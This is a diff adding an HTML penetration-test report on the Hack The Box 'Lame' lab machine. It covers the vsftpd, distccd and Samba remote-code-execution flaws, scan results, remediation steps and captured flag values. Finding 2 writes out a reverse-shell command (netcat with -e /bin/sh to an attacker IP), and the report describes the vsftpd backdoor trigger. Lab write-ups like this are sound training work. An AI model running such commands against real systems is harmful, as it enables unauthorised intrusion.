@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Penetration Testing Report - Lame</title>
+    <style>
+        /* --- Universal Styles for Screen and Print --- */
+        body {
+            background-color: #0a4b63; /* Dark Teal Background */
+            color: #f0f0f0; /* Off-white text for readability */
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            /* ** Crucial for forcing background colors in print ** */
+            -webkit-print-color-adjust: exact;
+            print-color-adjust: exact;
+        }
+        .container {
+            max-width: 900px;
+            margin: 40px auto;
+            padding: 20px 40px;
+            background-color: #0c5975;
+            border-radius: 8px;
+            box-shadow: 0 0 15px rgba(0,0,0,0.5);
+        }
+        h1, h2, h3, h4 {
+            color: #ffffff;
+            border-bottom: 1px solid #2a9d8f;
+            padding-bottom: 10px;
+        }
+        h1 {
+            text-align: center;
+            font-size: 2.5em;
+            padding: 20px 0;
+            border-top: 3px solid #93c47d; /* Green accent line */
+            border-bottom: 3px solid #93c47d; /* Green accent line */
+            margin-bottom: 5px;
+        }
+        h2.subtitle {
+             text-align: center;
+             font-size: 1.8em;
+             border: none;
+             margin-top: 0;
+             margin-bottom: 5px;
+        }
+        h3.report-meta {
+            text-align: center;
+            font-size: 1.2em;
+            border: none;
+            margin-top: 0;
+            margin-bottom: 5px;
+        }
+        hr {
+            border: 0;
+            height: 1px;
+            background-color: #2a9d8f;
+            margin: 30px 0;
+        }
+        .confidential {
+            text-align: center;
+            margin: 20px 0;
+        }
+        .confidential strong {
+            font-size: 1.1em;
+        }
+        .confidential em {
+            font-size: 0.9em;
+            color: #cccccc;
+        }
+        a {
+            color: #93c47d; /* Green accent for links */
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        ul, ol {
+            padding-left: 20px;
+        }
+        li {
+            margin-bottom: 10px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 25px 0;
+        }
+        th, td {
+            padding: 12px;
+            text-align: left;
+            border: 1px solid #1a7469;
+        }
+        thead {
+            background-color: #93c47d; /* Green accent for table headers */
+            color: #0a4b63;
+            /* ** Crucial for forcing background colors in print ** */
+            -webkit-print-color-adjust: exact;
+            print-color-adjust: exact;
+        }
+        thead th {
+             font-weight: bold;
+        }
+        tbody tr:nth-child(even) {
+            background-color: #0a4b63; /* Striped rows */
+        }
+        pre {
+            background-color: #002b36; /* Darker background for code */
+            color: #cddc39; /* Lime green text for code */
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            border: 1px solid #1a7469;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        code {
+            font-family: 'Courier New', Courier, monospace;
+        }
+        .footer {
+             text-align: center;
+             margin-top: 40px;
+             font-style: italic;
+             color: #cccccc;
+        }
+        
+        /* This rule helps control the margins set by the browser's print function */
+        @page {
+            margin: 0.75in;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="container">
+
+        <h1>CAPTURE THE FLAG PENETRATION TESTING</h1>
+        <h2 class="subtitle">Report of Findings: Lame</h2>
+        <h3 class="report-meta">Date: May 1, 2025</h3>
+        <h3 class="report-meta">Version: 1.0</h3>
+
+        <div class="confidential">
+            <strong>CONFIDENTIAL</strong><br>
+            <em>For educational and training purposes only</em>
+        </div>
+
+        <hr>
+        
+        <h2 id="table-of-contents">TABLE OF CONTENTS</h2>
+        <ol>
+            <li><a href="#executive-summary">Executive Summary</a></li>
+            <li><a href="#technical-summary">Technical Summary</a></li>
+            <li><a href="#detailed-findings">Detailed Technical Findings</a></li>
+            <li><a href="#attack-timeline">Attack Timeline</a></li>
+            <li><a href="#port-scan">Port Scan Results</a></li>
+            <li><a href="#remediation">Remediation Recommendations</a></li>
+            <li><a href="#evidence">Evidence Files</a></li>
+            <li><a href="#conclusion">Conclusion</a></li>
+        </ol>
+
+        <hr>
+
+        <h2 id="executive-summary">EXECUTIVE SUMMARY</h2>
+        <p>This report details the findings of a penetration test on the HTB Lame machine (10.10.10.3). The assessment identified multiple critical vulnerabilities in outdated and misconfigured services, which allowed an unauthenticated attacker to gain full administrative control of the system. The primary vectors of compromise were a backdoored version of vsftpd, a command execution vulnerability in distccd, and a known remote code execution vulnerability in Samba. Any of these flaws could be independently exploited to gain root access, indicating a severe lack of security patching and configuration management.</p>
+        
+        <h3>Key Findings Summary</h3>
+        <ul>
+            <li><strong>3 distinct critical vulnerabilities</strong> leading to root access.</li>
+            <li><strong>Complete system compromise</strong> achieved.</li>
+            <li><strong>vsftpd v2.3.4 Backdoor (CVE-2011-2523)</strong> allowing for a reverse shell. [3, 2]</li>
+            <li><strong>distccd v1 Command Execution (CVE-2004-2687)</strong> allowing for arbitrary command execution.</li>
+            <li><strong>Samba "usermap_script" RCE (CVE-2007-2447)</strong> providing a root shell via a Metasploit module.</li>
+        </ul>
+
+        <h3>Risk Level: CRITICAL</h3>
+        <p>The system is critically vulnerable due to the presence of multiple, well-known, and easily exploitable remote code execution vulnerabilities in its core services. The lack of basic security updates and secure configuration exposes the system to trivial compromise by an external attacker.</p>
+
+        <hr>
+
+        <h2 id="technical-summary">TECHNICAL SUMMARY</h2>
+        
+        <h3>Target Information</h3>
+        <ul>
+            <li><strong>Target IP:</strong> 10.10.10.3</li>
+            <li><strong>Attacker IP:</strong> 10.10.14.14</li>
+            <li><strong>Operating System:</strong> Linux (Debian based)</li>
+            <li><strong>Hostname:</strong> LAME</li>
+        </ul>
+
+        <h3>Attack Vector Summary</h3>
+        <ol>
+            <li><strong>Initial Access & Privilege Escalation (Vector 1):</strong> Exploitation of a backdoor in vsftpd v2.3.4 (CVE-2011-2523). Sending a specific sequence to the FTP port triggers a bind shell on port 6200.</li>
+            <li><strong>Initial Access & Privilege Escalation (Vector 2):</strong> Exploitation of a command execution vulnerability in distccd (CVE-2004-2687). A crafted command was sent to the distccd service on port 3632, resulting in a reverse shell as the `daemon` user.</li>
+            <li><strong>Initial Access & Privilege Escalation (Vector 3):</strong> Exploitation of a remote code execution vulnerability in Samba v3.0.20 (CVE-2007-2447). The `usermap_script` vulnerability was exploited using a Metasploit module to gain a direct root shell.</li>
+        </ol>
+
+        <hr>
+
+        <h2 id="detailed-findings">DETAILED TECHNICAL FINDINGS</h2>
+
+        <h3>Finding 1: vsftpd v2.3.4 Backdoor (CVE-2011-2523)</h3>
+        <p><strong>Severity:</strong> CRITICAL<br>
+        <strong>CVSS Score:</strong> 10.0<br>
+        <strong>CWE:</strong> CWE-78 (OS Command Injection)</p>
+        <p><strong>Description:</strong><br>
+        The version of vsftpd (Very Secure FTP Daemon) running on port 21 is 2.3.4. A specific version of this software, distributed for a short period, contained a malicious backdoor. When a username containing the sequence `:)` is sent to the FTP server, it triggers a bind shell to open on TCP port 6200. [2] An attacker can then connect to this port to gain a root shell on the system. [2]</p>
+        <p><strong>Technical Details:</strong></p>
+        <ul>
+            <li><strong>Vulnerable Service:</strong> vsftpd 2.3.4</li>
+            <li><strong>Trigger:</strong> Malformed username sent to the FTP port.</li>
+        </ul>
+        <p><strong>Impact:</strong> This vulnerability allows an unauthenticated, remote attacker to gain immediate root-level command execution on the system.</p>
+
+        <h3>Finding 2: distccd v1 Arbitrary Command Execution (CVE-2004-2687)</h3>
+        <p><strong>Severity:</strong> CRITICAL<br>
+        <strong>CVSS Score:</strong> 9.3<br>
+        <strong>CWE:</strong> CWE-78 (OS Command Injection)</p>
+        <p><strong>Description:</strong><br>
+        The distccd (Distributed C/C++/Objective C Compiler) service on port 3632 is running with weak service configuration. It is vulnerable to arbitrary command execution because it does not properly sanitize input. An attacker can craft a request to the service that will be executed as a shell command by the `daemon` user.</p>
+        <p><strong>Technical Details:</strong></p>
+        <ul>
+            <li><strong>Vulnerable Service:</strong> distccd v1</li>
+            <li><strong>Exploitation Method:</strong> Sending a specially crafted command sequence to the service.</li>
+        </ul>
+        <p><strong>Evidence:</strong><br>The following command was used to gain a reverse shell:</p>
+        <pre><code>python3 distccd_rce.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.14 4444 -e /bin/sh"</code></pre>
+        <p><strong>Impact:</strong> This vulnerability allows an unauthenticated, remote attacker to execute arbitrary commands as the `daemon` user, providing an initial foothold on the system.</p>
+
+        <h3>Finding 3: Samba "usermap_script" Remote Code Execution (CVE-2007-2447)</h3>
+        <p><strong>Severity:</strong> CRITICAL<br>
+        <strong>CVSS Score:</strong> 10.0<br>
+        <strong>CWE:</strong> CWE-78 (OS Command Injection)</p>
+        <p><strong>Description:</strong><br>
+        The version of Samba (3.0.20-Debian) running on ports 139 and 445 is vulnerable to a remote command execution vulnerability. A crafted username is sent to the service, and due to a flaw in the `usermap_script` feature, this username is executed as a shell command with root privileges.</p>
+        <p><strong>Technical Details:</strong></p>
+        <ul>
+            <li><strong>Vulnerable Service:</strong> Samba 3.0.20-Debian</li>
+            <li><strong>Exploitation Method:</strong> Use of the `multi/samba/usermap_script` exploit module in Metasploit.</li>
+        </ul>
+        <p><strong>Impact:</strong> This vulnerability provides an unauthenticated, remote attacker with direct root-level command execution, leading to a full system compromise.</p>
+
+        <hr>
+
+        <h2 id="attack-timeline">ATTACK TIMELINE</h2>
+        
+        <h3>Phase 1: Reconnaissance</h3>
+        <ul>
+            <li><strong>Port Scanning:</strong> `nmap` scan identified FTP (21), SSH (22), Samba (139/445), and distccd (3632) services.</li>
+            <li><strong>Vulnerability Scanning:</strong> Nmap's vulnerability scanning scripts identified CVE-2011-2523, CVE-2004-2687, and CVE-2007-2447.</li>
+            <li><strong>SMB Enumeration:</strong> `enum4linux` was used to gather detailed information about the Samba service, identifying users and shares.</li>
+        </ul>
+
+        <h3>Phase 2: Exploitation (Multiple Vectors)</h3>
+        <ul>
+            <li><strong>Vector A (distccd):</strong> Executed a Python script targeting CVE-2004-2687 to gain a reverse shell as the `daemon` user.</li>
+            <li><strong>Vector B (Samba):</strong> Used the `usermap_script` exploit in Metasploit to gain a direct root shell. This was the most efficient path to compromise.</li>
+            <li><strong>Vector C (vsftpd):</strong> Sent a malicious username to the FTP server to trigger the CVE-2011-2523 backdoor, opening a shell on port 6200.</li>
+        </ul>
+        
+        <h3>Phase 3: Post-Exploitation</h3>
+        <ul>
+            <li><strong>Privilege Confirmation:</strong> Confirmed root access by running the `id` command.</li>
+            <li><strong>Flag Retrieval:</strong> Retrieved both `user.txt` and `root.txt`.</li>
+        </ul>
+
+        <hr>
+        
+        <h2 id="port-scan">PORT SCAN RESULTS</h2>
+        <h3>TCP Port Scan</h3>
+        <pre><code>PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 2.3.4
+22/tcp   open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
+3632/tcp open  distccd distccd v1 ((GNU) 4.2.4)</code></pre>
+
+        <hr>
+        
+        <h2 id="remediation">REMEDIATION RECOMMENDATIONS</h2>
+        
+        <h3>CRITICAL PRIORITY</h3>
+        <ol>
+            <li><strong>Update All Services:</strong> The system is running severely outdated and vulnerable versions of vsftpd, Samba, and distccd. Immediately update all system packages to their latest stable versions using the package manager (e.g., `apt-get update && apt-get upgrade`).</li>
+            <li><strong>Disable Unnecessary Services:</strong> The `distccd` service should be disabled if it is not essential for the machine's operation. Running services with known critical vulnerabilities poses an unacceptable risk.</li>
+            <li><strong>Implement a Firewall:</strong> Configure a host-based firewall (e.g., `ufw`) to restrict access to only the necessary services from trusted IP addresses. Ports like 21, 139, 445, and 3632 should not be exposed to the public internet unless absolutely necessary.</li>
+        </ol>
+
+        <h3>HIGH PRIORITY</h3>
+        <ol>
+            <li><strong>Secure Samba Configuration:</strong> If Samba is required, ensure its configuration (`smb.conf`) is hardened. The `usermap_script` feature should be disabled or pointed to a secure, non-user-writable script. Anonymous access to shares should be disabled.</li>
+            <li><strong>Regular Vulnerability Scanning:</strong> Implement a regular, automated vulnerability scanning process to identify and remediate outdated software and misconfigurations before they can be exploited.</li>
+        </ol>
+
+        <hr>
+
+        <h2 id="evidence">EVIDENCE FILES</h2>
+        
+        <h3>User Flag</h3>
+        <ul>
+            <li><strong>Location:</strong> /home/makis/user.txt</li>
+            <li><strong>Value:</strong> fc71d8ff937e57d82998c7f0437b3e61</li>
+        </ul>
+
+        <h3>Root Flag</h3>
+        <ul>
+            <li><strong>Location:</strong> /root/root.txt</li>
+            <li><strong>Value:</strong> 95ca3cd13c783a17d1996c86e76d9c21</li>
+        </ul>
+
+        <h3>Key Artifacts</h3>
+        <ul>
+            <li><strong>vsftpd Vulnerability:</strong> CVE-2011-2523</li>
+            <li><strong>distccd Vulnerability:</strong> CVE-2004-2687</li>
+            <li><strong>Samba Vulnerability:</strong> CVE-2007-2447</li>
+        </ul>
+
+        <hr>
+
+        <h2 id="conclusion">CONCLUSION</h2>
+        <p>The HTB Lame machine is a textbook example of a system with a complete lack of security maintenance. It is plagued by multiple critical, well-documented vulnerabilities that have been known for over a decade. The presence of these flaws in vsftpd, distccd, and Samba provided several trivial paths for an attacker to gain immediate root-level access. The successful compromise of this machine required minimal effort and relied on publicly available exploits for outdated software. This underscores the absolute necessity of a robust patch management program and the principle of running only necessary and securely configured services.</p>
+        
+        <p><strong>Business Risk:</strong> CRITICAL - The system is completely exposed and can be fully compromised by any attacker with basic skills. This represents a total loss of confidentiality, integrity, and availability, and the machine could be used to launch further attacks against the network.</p>
+        <p><strong>Technical Risk:</strong> The presence of multiple, unpatched, high-severity remote code execution vulnerabilities in public-facing services creates a trivial and guaranteed path to full system compromise.</p>
+        
+        <hr>
+
+        <div class="footer">
+            <p><strong>Report prepared by:</strong> Security Assessment Team<br>
+            <strong>Date:</strong> May 1, 2025</p>
+            <p>CONFIDENTIAL - For educational purposes only</p>
+        </div>
+
+    </div>
+
+</body>
+</html>
